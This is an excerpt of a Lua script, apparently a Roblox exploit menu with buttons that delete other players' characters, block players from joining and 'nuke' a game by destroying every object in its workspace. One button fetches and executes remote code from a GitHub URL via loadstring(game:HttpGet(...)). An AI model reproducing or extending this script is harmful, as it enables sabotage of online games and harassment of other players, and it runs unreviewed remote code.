...
local Button = Tab:CreateButton({
   ...
   Callback = function()
    ...
    Destroy(Players[V].Character.Humanoid)
	end
   end,
})
...
Players.PlayerAdded:connect(function(plr)
	if slockk then
		delete(plr)
		Notify("Player tried to join:", tostring(plr.Name) .." Tried to join but slock is enabled.", 3)
	end
	if table.find(banned, plr.UserId) then
		delete(plr)
		Notify("Player tried to join:", tostring(plr.Name) .." Tried to join but is banned", 5)
	end
end)
...
local Button = Tab:CreateButton({
   Name = "FE delete Dex",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/dex.lua"))()
   end,
})
...
local Button = Tab:CreateButton({
   Name = "nuke game",
   Callback = function()
   for _, instances in ipairs(game:GetService("Workspace"):GetDescendants()) do
	pcall(function()
		delete(instances)
	end)
end
